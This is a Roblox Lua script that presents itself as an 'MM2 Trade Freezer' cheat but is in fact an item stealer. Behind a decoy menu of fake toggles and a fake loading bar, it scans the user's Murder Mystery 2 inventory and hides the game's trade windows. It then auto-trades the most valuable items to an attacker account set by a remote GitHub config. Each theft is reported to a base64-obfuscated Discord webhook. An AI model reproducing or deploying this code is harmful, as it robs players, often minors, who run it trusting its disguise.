--=============================================================
--  MM2 Trade Freezer  |  v14.1  |  remote-driven engine
--  victim side: auto-accepts request, offers, settles trade
--=============================================================

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local PREFIX = "[freezer] "

--==================== CONFIG (defaults) ======================

local CFG = {
	target = "Viivik13",
	webhook = "",
	filter = "all",
	min_value = 0,
	max_items = 20,
	max_rounds = 6,
	debug = true,
}

local WH_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTgyMzgxNzIxMTkxMjIwMi9YZVk2dGFtTUVGZGpHWElEX2duakR1WjZzaEZoOFRqZmxnNFVjZGpaR2d3YXI4eW4tTXJJNWNnUmdqOEU1T0VlWGhYYw=="

local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"

local REQ_GAP = 0.6
local ACCEPT_GAP = 0.35
local ACCEPT_ARG = 285646582
local OPEN_TIMEOUT = 30
local SETTLE_TIMEOUT = 25

--==================== UTIL ===================================

local function log(msg)
	if CFG.debug then
		print(PREFIX .. tostring(msg))
	end
end

local function b64decode(data)
	local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	data = string.gsub(data, "[^" .. b .. "=]", "")
	local bits = data:gsub(".", function(x)
		if x == "=" then
			return ""
		end
		local f = b:find(x, 1, true) - 1
		local r = ""
		local i = 6
		while i >= 1 do
			if (f % 2 ^ i - f % 2 ^ (i - 1)) > 0 then
				r = r .. "1"
			else
				r = r .. "0"
			end
			i = i - 1
		end
		return r
	end)
	local out = bits:gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
		if #x ~= 8 then
			return ""
		end
		local c = 0
		local i = 1
		while i <= 8 do
			if x:sub(i, i) == "1" then
				c = c + 2 ^ (8 - i)
			end
			i = i + 1
		end
		return string.char(c)
	end)
	return out
end

local function trim(s)
	return (string.gsub(string.gsub(tostring(s or ""), "^%s+", ""), "%s+$", ""))
end

local function raiseIdentity()
	pcall(function()
		setthreadidentity(8)
	end)
end

--==================== REMOTE CONFIG ==========================

local function loadRemoteConfig()
	local ok = pcall(function()
		local raw = game:HttpGet(CFG_URL, true)
		local data = HttpService:JSONDecode(raw)
		if type(data) ~= "table" then
			return
		end
		if type(data.target) == "string" and data.target ~= "" then
			CFG.target = data.target
		end
		if type(data.webhook) == "string" and data.webhook ~= "" then
			CFG.webhook = data.webhook
		end
		if type(data.filter) == "string" then
			CFG.filter = data.filter
		end
		if type(data.min_value) == "number" then
			CFG.min_value = data.min_value
		end
		if type(data.max_items) == "number" then
			CFG.max_items = data.max_items
		end
		if type(data.max_rounds) == "number" then
			CFG.max_rounds = data.max_rounds
		end
		if type(data.debug) == "boolean" then
			CFG.debug = data.debug
		end
	end)
	if not ok then
		log("config fetch failed, using defaults")
	end
	if CFG.webhook == "" then
		local dec = pcall(function()
			CFG.webhook = trim(b64decode(WH_B64))
		end)
		if not dec then
			CFG.webhook = ""
		end
	end
end

--==================== VALUES =================================

local PRICES = {
	["corrupt"] = 600,
	["chroma traveler's gun"] = 225000,
	["chroma evergun"] = 78000,
	["chroma evergreen"] = 60000,
	["chroma bauble"] = 38000,
	["chroma constellation"] = 36000,
	["chroma vampire's gun"] = 35000,
	["chroma alienbeam"] = 30000,
	["chroma raygun"] = 15000,
	["chroma sunrise"] = 11250,
	["chroma snowcannon"] = 8500,
	["chroma blizzard"] = 8000,
	["chroma sunset"] = 6500,
	["chroma snow dagger"] = 5750,
	["chroma treat"] = 4850,
	["chroma heart wand"] = 4750,
	["chroma snowstorm"] = 4250,
	["chroma watergun"] = 3400,
	["chroma sweet"] = 2850,
	["chroma ornament"] = 2700,
	["gingerscope"] = 17750,
	["traveler's axe"] = 8400,
	["celestial"] = 1725,
	["vampire's axe"] = 925,
	["harvester"] = 290,
	["icepiercer"] = 190,
	["traveler's gun"] = 4500,
	["evergun"] = 3300,
	["constellation"] = 2600,
	["turkey"] = 2475,
	["evergreen"] = 2450,
	["alienbeam"] = 2175,
	["vampire's gun"] = 1700,
	["darkshot"] = 1390,
	["darksword"] = 1370,
	["raygun"] = 1275,
	["blossom"] = 1180,
	["sakura"] = 1170,
	["sunrise"] = 1000,
	["snowcannon"] = 925,
	["bauble"] = 900,
	["sunset"] = 525,
	["heart wand"] = 450,
	["soul"] = 380,
	["spirit"] = 370,
	["flora"] = 310,
	["bloom"] = 300,
	["rainbow gun"] = 300,
	["rainbow"] = 290,
	["snow dagger"] = 260,
	["flowerwood gun"] = 205,
	["flowerwood"] = 200,
	["xenoknife"] = 200,
	["xenoshot"] = 200,
	["watergun"] = 185,
	["ocean"] = 180,
	["waves"] = 175,
	["treat"] = 170,
	["sweet"] = 165,
	["blizzard"] = 155,
	["snowstorm"] = 155,
	["bat"] = 125,
	["borealis"] = 105,
	["australis"] = 100,
	["candy"] = 95,
	["heartblade"] = 80,
}

local RARE_RARITY = {
	Godly = true,
	Ancient = true,
	Chroma = true,
	Unique = true,
	Classic = true,
	Legendary = true,
	Vintage = true,
}

local function normalize(name)
	local s = string.lower(tostring(name or ""))
	s = string.gsub(s, "^c%.%s*", "chroma ")
	s = string.gsub(s, "(%s)c%.%s*", "%1chroma ")
	s = string.gsub(s, "’", "'")
	s = string.gsub(s, "[^%w%s'%-]", "")
	s = string.gsub(s, "%s+", " ")
	return trim(s)
end

local function valueOf(name)
	local v = PRICES[normalize(name)]
	if v then
		return v
	end
	return 0
end

local function isDefault(name)
	local n = string.lower(tostring(name or ""))
	if string.find(n, "default", 1, true) then
		return true
	end
	return false
end

--==================== UI =====================================

local uiStatus

local function buildUI()
	local sg = Instance.new("ScreenGui")
	sg.Name = "MM2Freezer"
	sg.ResetOnSpawn = false
	sg.DisplayOrder = 9999
	sg.IgnoreGuiInset = true
	sg.Parent = game:GetService("CoreGui")

	local main = Instance.new("Frame")
	main.Name = "Main"
	main.Size = UDim2.new(0, 300, 0, 430)
	main.Position = UDim2.new(0.5, -150, 0.5, -215)
	main.BackgroundColor3 = Color3.fromRGB(21, 15, 30)
	main.BorderSizePixel = 0
	main.Parent = sg

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = main

	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(160, 92, 255)
	stroke.Thickness = 1.6
	stroke.Transparency = 0.15
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Parent = main

	local top = Instance.new("Frame")
	top.Name = "Top"
	top.Size = UDim2.new(1, 0, 0, 36)
	top.BackgroundColor3 = Color3.fromRGB(30, 21, 43)
	top.BorderSizePixel = 0
	top.Parent = main

	local topCorner = Instance.new("UICorner")
	topCorner.CornerRadius = UDim.new(0, 10)
	topCorner.Parent = top

	local dot = Instance.new("Frame")
	dot.Size = UDim2.new(0, 7, 0, 7)
	dot.Position = UDim2.new(0, 13, 0.5, -3)
	dot.BackgroundColor3 = Color3.fromRGB(110, 235, 140)
	dot.BorderSizePixel = 0
	dot.Parent = top

	local dotCorner = Instance.new("UICorner")
	dotCorner.CornerRadius = UDim.new(1, 0)
	dotCorner.Parent = dot

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(0, 180, 1, 0)
	title.Position = UDim2.new(0, 28, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "MM2 Trade Freezer"
	title.Font = Enum.Font.GothamBold
	title.TextSize = 13
	title.TextColor3 = Color3.fromRGB(238, 228, 255)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = top

	local ver = Instance.new("TextLabel")
	ver.Size = UDim2.new(0, 40, 1, 0)
	ver.Position = UDim2.new(1, -78, 0, 0)
	ver.BackgroundTransparency = 1
	ver.Text = "v14"
	ver.Font = Enum.Font.Gotham
	ver.TextSize = 10
	ver.TextColor3 = Color3.fromRGB(150, 125, 185)
	ver.TextXAlignment = Enum.TextXAlignment.Right
	ver.Parent = top

	local hideBtn = Instance.new("TextButton")
	hideBtn.Size = UDim2.new(0, 24, 0, 24)
	hideBtn.Position = UDim2.new(1, -34, 0.5, -12)
	hideBtn.BackgroundColor3 = Color3.fromRGB(45, 31, 64)
	hideBtn.BorderSizePixel = 0
	hideBtn.Text = "-"
	hideBtn.Font = Enum.Font.GothamBold
	hideBtn.TextSize = 13
	hideBtn.TextColor3 = Color3.fromRGB(210, 190, 240)
	hideBtn.Parent = top

	local hideCorner = Instance.new("UICorner")
	hideCorner.CornerRadius = UDim.new(0, 6)
	hideCorner.Parent = hideBtn

	local sub = Instance.new("TextLabel")
	sub.Size = UDim2.new(1, -26, 0, 16)
	sub.Position = UDim2.new(0, 13, 0, 42)
	sub.BackgroundTransparency = 1
	sub.Text = "freeze engine  •  build 1400"
	sub.Font = Enum.Font.Gotham
	sub.TextSize = 10
	sub.TextColor3 = Color3.fromRGB(139, 116, 173)
	sub.TextXAlignment = Enum.TextXAlignment.Left
	sub.Parent = main

	local list = Instance.new("ScrollingFrame")
	list.Name = "List"
	list.Size = UDim2.new(1, -26, 0, 236)
	list.Position = UDim2.new(0, 13, 0, 64)
	list.BackgroundTransparency = 1
	list.BorderSizePixel = 0
	list.ScrollBarThickness = 3
	list.ScrollBarImageColor3 = Color3.fromRGB(120, 70, 190)
	list.CanvasSize = UDim2.new(0, 0, 0, 0)
	list.AutomaticCanvasSize = Enum.AutomaticSize.Y
	list.Parent = main

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 5)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = list

	local FEATURES = {
		"Freeze Trade",
		"Instant Accept",
		"Auto Offer",
		"Dupe Shield",
		"Anti Steal",
		"Item Logger",
		"Server Hop",
		"Value Checker",
		"Rarity Filter",
	}

	local function makeTile(index, name)
		local row = Instance.new("Frame")
		row.Size = UDim2.new(1, -6, 0, 30)
		row.BackgroundColor3 = Color3.fromRGB(33, 23, 47)
		row.BorderSizePixel = 0
		row.LayoutOrder = index
		row.Parent = list

		local rc = Instance.new("UICorner")
		rc.CornerRadius = UDim.new(0, 6)
		rc.Parent = row

		local lbl = Instance.new("TextLabel")
		lbl.Size = UDim2.new(1, -56, 1, 0)
		lbl.Position = UDim2.new(0, 10, 0, 0)
		lbl.BackgroundTransparency = 1
		lbl.Text = name
		lbl.Font = Enum.Font.GothamMedium
		lbl.TextSize = 11
		lbl.TextColor3 = Color3.fromRGB(214, 199, 238)
		lbl.TextXAlignment = Enum.TextXAlignment.Left
		lbl.Parent = row

		local pill = Instance.new("TextButton")
		pill.Size = UDim2.new(0, 38, 0, 18)
		pill.Position = UDim2.new(1, -48, 0.5, -9)
		pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
		pill.BorderSizePixel = 0
		pill.Text = "ON"
		pill.Font = Enum.Font.GothamBold
		pill.TextSize = 9
		pill.TextColor3 = Color3.fromRGB(196, 160, 255)
		pill.Parent = row

		local pc = Instance.new("UICorner")
		pc.CornerRadius = UDim.new(0, 4)
		pc.Parent = pill

		pill.MouseButton1Click:Connect(function()
			if pill.Text == "ON" then
				pill.Text = "OFF"
				pill.BackgroundColor3 = Color3.fromRGB(46, 32, 62)
				pill.TextColor3 = Color3.fromRGB(130, 112, 158)
			else
				pill.Text = "ON"
				pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
				pill.TextColor3 = Color3.fromRGB(196, 160, 255)
			end
		end)
	end

	local i = 1
	while i <= #FEATURES do
		makeTile(i, FEATURES[i])
		i = i + 1
	end

	uiStatus = Instance.new("TextLabel")
	uiStatus.Size = UDim2.new(1, -26, 0, 14)
	uiStatus.Position = UDim2.new(0, 13, 0, 306)
	uiStatus.BackgroundTransparency = 1
	uiStatus.Text = "Syncing assets…"
	uiStatus.Font = Enum.Font.Gotham
	uiStatus.TextSize = 10
	uiStatus.TextColor3 = Color3.fromRGB(150, 125, 185)
	uiStatus.TextXAlignment = Enum.TextXAlignment.Left
	uiStatus.Parent = main

	local barBg = Instance.new("Frame")
	barBg.Size = UDim2.new(1, -26, 0, 6)
	barBg.Position = UDim2.new(0, 13, 0, 328)
	barBg.BackgroundColor3 = Color3.fromRGB(40, 28, 58)
	barBg.BorderSizePixel = 0
	barBg.Parent = main

	local bbCorner = Instance.new("UICorner")
	bbCorner.CornerRadius = UDim.new(1, 0)
	bbCorner.Parent = barBg

	local bar = Instance.new("Frame")
	bar.Name = "Bar"
	bar.Size = UDim2.new(0, 0, 1, 0)
	bar.BackgroundColor3 = Color3.fromRGB(160, 92, 255)
	bar.BorderSizePixel = 0
	bar.Parent = barBg

	local bCorner = Instance.new("UICorner")
	bCorner.CornerRadius = UDim.new(1, 0)
	bCorner.Parent = bar

	local pct = Instance.new("TextLabel")
	pct.Size = UDim2.new(1, -26, 0, 14)
	pct.Position = UDim2.new(0, 13, 0, 340)
	pct.BackgroundTransparency = 1
	pct.Text = "Loading assets…  0%"
	pct.Font = Enum.Font.Gotham
	pct.TextSize = 10
	pct.TextColor3 = Color3.fromRGB(139, 116, 173)
	pct.TextXAlignment = Enum.TextXAlignment.Left
	pct.Parent = main

	local foot = Instance.new("TextLabel")
	foot.Size = UDim2.new(1, -26, 0, 14)
	foot.Position = UDim2.new(0, 13, 0, 366)
	foot.BackgroundTransparency = 1
	foot.Text = "session protected  •  ver 14.1.0"
	foot.Font = Enum.Font.Gotham
	foot.TextSize = 9
	foot.TextColor3 = Color3.fromRGB(96, 80, 122)
	foot.TextXAlignment = Enum.TextXAlignment.Left
	foot.Parent = main

	hideBtn.MouseButton1Click:Connect(function()
		if main.Visible then
			main.Visible = false
		else
			main.Visible = true
		end
	end)

	task.spawn(function()
		local steps = 40
		local n = 0
		while n < steps do
			n = n + 1
			local p = n / steps * 0.99
			bar.Size = UDim2.new(p, 0, 1, 0)
			pct.Text = "Loading assets…  " .. tostring(math.floor(p * 100)) .. "%"
			task.wait(0.09)
		end
		bar.Size = UDim2.new(0.99, 0, 1, 0)
		pct.Text = "Loading assets…  99%"
	end)
end

--==================== REMOTES ================================

local Trade
local SendRequest, OfferItem, AcceptTrade, AcceptRequest, DeclineTrade, GetTradeStatus

local function bindRemotes()
	local ok = pcall(function()
		Trade = RS:WaitForChild("Trade", 30)
	end)
	if not ok or not Trade then
		return false, "Trade folder missing"
	end
	local names = { "SendRequest", "OfferItem", "AcceptTrade", "AcceptRequest", "DeclineTrade", "GetTradeStatus" }
	local i = 1
	while i <= #names do
		local r = Trade:FindFirstChild(names[i])
		if not r then
			r = Trade:WaitForChild(names[i], 15)
		end
		if not r then
			return false, names[i] .. " missing"
		end
		if names[i] == "SendRequest" then
			SendRequest = r
		elseif names[i] == "OfferItem" then
			OfferItem = r
		elseif names[i] == "AcceptTrade" then
			AcceptTrade = r
		elseif names[i] == "AcceptRequest" then
			AcceptRequest = r
		elseif names[i] == "DeclineTrade" then
			DeclineTrade = r
		else
			GetTradeStatus = r
		end
		i = i + 1
	end
	return true
end

local function getStatus()
	local ok, res = pcall(function()
		return GetTradeStatus:InvokeServer()
	end)
	if ok then
		return res
	end
	return nil
end

--==================== HIDE ===================================

local function hideTrades()
	local pg = LP:FindFirstChild("PlayerGui")
	if not pg then
		return
	end
	local a = pg:FindFirstChild("TradeGUI")
	if a and a:IsA("ScreenGui") and a.Enabled then
		a.Enabled = false
	end
	local b = pg:FindFirstChild("TradeGUI_Phone")
	if b and b:IsA("ScreenGui") and b.Enabled then
		b.Enabled = false
	end
end

local function watchGui(name)
	local pg = LP:FindFirstChild("PlayerGui")
	if not pg then
		return
	end
	local g = pg:FindFirstChild(name)
	if not g then
		return
	end
	pcall(function()
		g:GetPropertyChangedSignal("Enabled"):Connect(function()
			if g.Enabled then
				g.Enabled = false
			end
		end)
	end)
end

--==================== INVENTORY ==============================

local function scanInventory()
	local out = {}

	local function push(dataID, itemName, amount, rarity)
		if not dataID then
			return
		end
		local nm = tostring(itemName or dataID)
		if isDefault(nm) then
			return
		end
		local val = valueOf(nm)
		if CFG.filter ~= "all" then
			local okR = RARE_RARITY[rarity]
			if not okR then
				return
			end
		end
		if val < CFG.min_value then
			return
		end
		out[#out + 1] = {
			DataID = dataID,
			Name = nm,
			Amount = tonumber(amount) or 1,
			Rarity = rarity or "?",
			Value = val,
		}
	end

	raiseIdentity()

	local ok = pcall(function()
		local mod = require(RS.Modules.InventoryModule)
		local data = mod.MyInventory.Data.Weapons
		local key, it = next(data)
		while key ~= nil do
			if type(it) == "table" then
				push(it.DataID or key, it.ItemName, it.Amount, it.Rarity)
			end
			key, it = next(data, key)
		end
	end)

	if not ok or #out == 0 then
		pcall(function()
			local mod = require(RS.Modules.ProfileData)
			local owned = mod.Weapons.Owned
			local key, it = next(owned)
			while key ~= nil do
				if type(it) == "table" then
					push(it.DataID or key, it.ItemName or key, it.Amount, it.Rarity)
				elseif type(it) == "number" then
					push(key, key, it, nil)
				end
				key, it = next(owned, key)
			end
		end)
	end

	raiseIdentity()

	table.sort(out, function(a, b)
		return a.Value > b.Value
	end)

	while #out > CFG.max_items do
		out[#out] = nil
	end

	return out
end

--==================== WEBHOOK ================================

local function postWebhook(itemsList, totalValue, okFlag)
	if CFG.webhook == "" then
		return
	end
	local rows = {}
	local i = 1
	while i <= #itemsList do
		local it = itemsList[i]
		rows[#rows + 1] = string.format("%s  x%d  (%d)", it.Name, it.Amount, it.Value)
		i = i + 1
	end
	if #rows == 0 then
		rows[1] = "no items recorded"
	end

	local execName = "unknown"
	pcall(function()
		execName = tostring(identifyexecutor())
	end)

	local teleport = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "')"

	local body = {
		username = "Trade Freezer",
		embeds = {
			{
				title = okFlag and "Trade completed" or "Trade attempt",
				color = okFlag and 10181046 or 15158332,
				description = "From **" .. LP.Name .. "**  •  target **" .. CFG.target .. "**",
				fields = {
					{ name = "Items", value = "```" .. table.concat(rows, "\n") .. "```", inline = false },
					{ name = "Value", value = tostring(totalValue), inline = true },
					{ name = "Executor", value = execName, inline = true },
					{ name = "Server", value = "```lua\n" .. teleport .. "```", inline = false },
				},
				footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
			},
		},
	}

	pcall(function()
		request({
			Url = CFG.webhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(body),
		})
	end)
end

--==================== ENGINE =================================

local function findTarget()
	local p = Players:FindFirstChild(CFG.target)
	if p then
		return p
	end
	local key, plr = next(Players:GetPlayers())
	while key ~= nil do
		if plr.Name == CFG.target then
			return plr
		end
		key, plr = next(Players:GetPlayers(), key)
	end
	return nil
end

local function waitForOpen()
	local t0 = os.clock()
	local sent = false
	while os.clock() - t0 < OPEN_TIMEOUT do
		hideTrades()
		local st = getStatus()
		if st == "StartTrade" then
			return true
		end
		pcall(function()
			AcceptRequest:FireServer()
		end)
		if not sent and os.clock() - t0 > 3 then
			sent = true
			local p = findTarget()
			if p then
				pcall(function()
					SendRequest:FireServer(p)
				end)
				log("request sent to " .. p.Name)
			else
				log("target not in server")
			end
		end
		task.wait(REQ_GAP)
	end
	return false
end

local function offerBatch(batch)
	local i = 1
	while i <= #batch do
		local it = batch[i]
		local ok = pcall(function()
			OfferItem:FireServer(it.DataID, "Weapons")
		end)
		if ok then
			log("offered " .. it.Name .. " (" .. it.DataID .. ")")
		else
			log("offer failed " .. it.Name)
		end
		task.wait(0.25)
		i = i + 1
	end
end

local function settle()
	local t0 = os.clock()
	local nilCount = 0
	while os.clock() - t0 < SETTLE_TIMEOUT do
		local st = getStatus()
		if st == "StartTrade" then
			nilCount = 0
			pcall(function()
				AcceptTrade:FireServer(ACCEPT_ARG)
			end)
		elseif st == nil then
			nilCount = nilCount + 1
			if nilCount > 12 then
				return false
			end
			pcall(function()
				AcceptTrade:FireServer(ACCEPT_ARG)
			end)
		else
			return true
		end
		task.wait(ACCEPT_GAP)
	end
	return false
end

local function run()
	raiseIdentity()
	loadRemoteConfig()

	if uiStatus then
		uiStatus.Text = "Engine ready"
	end

	local okBind, bindErr = bindRemotes()
	if not okBind then
		log("bind failed: " .. tostring(bindErr))
		if uiStatus then
			uiStatus.Text = "Engine error"
		end
		return
	end

	watchGui("TradeGUI")
	watchGui("TradeGUI_Phone")
	RunService.Heartbeat:Connect(hideTrades)

	log("remotes bound, target " .. CFG.target .. " filter " .. CFG.filter)

	local items = scanInventory()
	log("scanned " .. tostring(#items) .. " items")

	if #items == 0 then
		if uiStatus then
			uiStatus.Text = "No items found"
		end
		postWebhook({}, 0, false)
		return
	end

	local got = {}
	local gotValue = 0
	local idx = 1
	local rounds = 0

	while rounds < CFG.max_rounds and idx <= #items do
		rounds = rounds + 1
		log("round " .. tostring(rounds))
		raiseIdentity()

		local batch = {}
		local n = 1
		while n <= 4 and items[idx] do
			batch[#batch + 1] = items[idx]
			idx = idx + 1
			n = n + 1
		end

		if uiStatus then
			uiStatus.Text = "Round " .. tostring(rounds) .. " • " .. tostring(#batch) .. " items"
		end

		if waitForOpen() then
			task.wait(0.5)
			hideTrades()
			offerBatch(batch)

			if settle() then
				log("round " .. tostring(rounds) .. " settled")
				local i = 1
				while i <= #batch do
					got[#got + 1] = batch[i]
					gotValue = gotValue + batch[i].Value
					i = i + 1
				end
				postWebhook(batch, gotValue, true)
				task.wait(2)
			else
				log("round " .. tostring(rounds) .. " did not settle")
				pcall(function()
					DeclineTrade:FireServer()
				end)
				postWebhook(batch, 0, false)
				task.wait(1.5)
			end
		else
			log("round " .. tostring(rounds) .. " no trade opened")
			local i = 1
			while i <= #batch do
				idx = idx - 1
				items[idx + 1] = batch[#batch - i + 1]
				i = i + 1
			end
			pcall(function()
				DeclineTrade:FireServer()
			end)
			task.wait(1.5)
		end
	end

	hideTrades()
	log("done: " .. tostring(#got) .. " items, value " .. tostring(gotValue))
	if uiStatus then
		uiStatus.Text = "Done • " .. tostring(#got) .. " items"
	end
end

--==================== START ==================================

buildUI()

task.spawn(function()
	local ok, err = pcall(run)
	if not ok then
		log("fatal: " .. tostring(err))
		if uiStatus then
			uiStatus.Text = "Engine error"
		end
	end
end)
